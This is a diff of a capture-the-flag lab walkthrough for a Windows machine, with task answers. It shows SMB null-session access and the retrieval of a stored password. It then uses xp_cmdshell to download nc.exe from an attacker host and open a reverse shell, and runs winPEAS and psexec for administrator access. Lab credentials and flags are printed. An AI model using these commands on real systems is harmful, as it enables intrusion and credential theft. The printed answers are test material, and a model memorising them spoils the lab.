@@ -1,7 +1,7 @@
-The target machine is: 10.129.237.186
+The target machine is: 10.129.24.28
 
-First we try to know if the machine is being active by using the command <ping 10.129.237.186>
-Then lets check what services are running and what ports are open using the nmap scan: <nmap -sC -sV 10.129.237.186>
+First we try to know if the machine is being active by using the command <ping 10.129.24.28>
+Then lets check what services are running and what ports are open using the nmap scan: <nmap -sC -sV 10.129.24.28>
 
 After the scan completes, we can easily see that there are 4 ports open and the results are as follows:
 
@@ -25,20 +25,137 @@ Answer: 1433
 
 Host script results show that there is samba service running on the machine so we can try to exploit null sessions using smbclient
 
-<smbclient -L //10.129.237.186 -N>
+<smbclient -L //10.129.24.28 -N>
 
-This lists the shares as: and we can see that non-Administrative share available is backups
+This lists the shares as: 
 
- 
-Sharename       Type      Comment
+ Sharename       Type      Comment
 ---------       ----      -------
 ADMIN$          Disk      Remote Admin
 backups         Disk      
 C$              Disk      Default share
 IPC$            IPC       Remote IPC
 
+and we can see that non-Administrative share available is backups
 
 Task 2: What is the name of the non-Administrative share available over SMB?
 
 Answer: backups
 
+So now lets try to connect to the backups share using the command <smbclient -N \\\\10.129.24.28\\backups>
+and we are in.
+we got a shell, and we can try to check what we have in it. So, we found a config file there and we can download it 
+using <get #filename> and its downloaded in the directory from where we have launched smbclient.
+exit the smbclient and use the command <cat #filename> in order to see what are the contents and we can see that there is a password to the user ID Archetype\sqlsvc and the password is M3g4c0rp123
+
+Task 3: What is the password identified in the file on the SMB share?
+Answer: M3g4c0rp123
+
+Now we can check out what are the other services running on the different ports like ms-sql is running on port 1443, to try to get into the system using mssqlclient in a using impacket tool in linux using the command: 
+<locate mssqlclient> then just run the following command, by choosing the one from bin folder.
+</usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.24.28 -windows-auth>
+will be prompted for password which we have already
+just enter M3g4c0rp123 as password and we are in the sql shell.
+
+Task 4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? 
+Answer: mssqlclient.py
+
+Lets take a look what we can do here, just type help and what we see is this:
+
+SQL> help
+
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+
+run the command <enable_xp_cmdshell;> and then <RECONFIGURE;> 
+
+To test it out if its working, execute the command xp_cmdshell "whoami"
+The output we get is:
+
+archetype\sql_svc, which means its working fine.
+
+As we know that we can use netcat as a listener as well as a server, so lets search for the nc.exe file using locate nc.exe in our local machine. We can find that the nc.exe file is located in the direectory /usr/share/windows-resources/binaries, so from that directory we will run the python script:
+
+(root💀kali)-[/usr/share/windows-resources/binaries]
+└─# python3 -m http.server 80 
+
+now lets get back to the sql shell and grab this nc.exe file using the command:
+
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.116/nc.exe -outfile nc.exe"
+
+This command will send a request and get the nc.exe
+The send request on http.server 80 will look like this:
+10.129.24.28 - - [05/Sep/2022 14:29:11] "GET /nc.exe HTTP/1.1" 200 -
+
+Now we will be executing the netcat to get a stable reverse windows shell in the target machine but before that we have to 
+setup a listening port on natcat using: 
+
+──(root💀kali)-[~]
+└─# nc -lvnp 4444
+
+Getting back to SQL now and we can execute the following commmand to get a reverse shell.
+
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.15.116 4444"
+
+Task 5: What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
+Answer: xp_cmdshell
+
+This will give us the windows reverse shell where we were listening.
+
+connect to [10.10.15.116] from (UNKNOWN) [10.129.24.28] 49676
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\sql_svc\Downloads
+
+Lets try to grab some information from here, so getting into \Users\Desktop directory we found a file named user.txt which contained the user flag.
+
+user flag: 3e7b102e78218e935bf3f4951fec21a3
+
+Now the task is to get root privileges on the target machine. We can try this by privilege escalation using a popular tool winPEAS.
+
+Task 6: What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+answer: winpeas
+
+
+So we have to locate winPEAS.exe in our local machine and copy it to the target machine.
+
+Once we located the directory of winPEAS get into it and run the script: <python3 -m http.server 80>
+
+In the SQL shell we have, we can just run the command  <wget http://10.10.15.116/winPEAS.exe -outfile winpeas.exe
+
+This will save this file in the target system as winpeas.exe now we can just execute it using the command: .\winpeas.exe
+
+After it completes we will find quite some information and a file path which is frequenty occuring. Lets try to take a look what it actually contains.
+The path is: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+and this file contains the credentials of the admin:
+user:administrator pass: MEGACORP_4dm1n!!
+
+Task 7: Which file contains the administrator password?
+Answer: ConsoleHost_history.txt
+
+Task 8: What is the user flag?
+Answer: 3e7b102e78218e935bf3f4951fec21a3
+
+Now we can use the tool psexec in kali linux to get into the system using the command:
+
+/usr/bin/impacket-psexec administrator@10.129.24.28
+enter the password which we know already. MEGACORP_4dm1n!!
+
+and bingo.
+we are into the system with root privileges.
+
+get to the desktop directory and there we can find the final root flag as root.txt.
+
+root flag: b91ccec33xxxxxxxxxxxxxxxxxxxxx28
+
+Task 9: What is the root flag?
+Answer: b91ccec33xxxxxxxxxxxxxxxxxxxxx28
+
+Thank You.
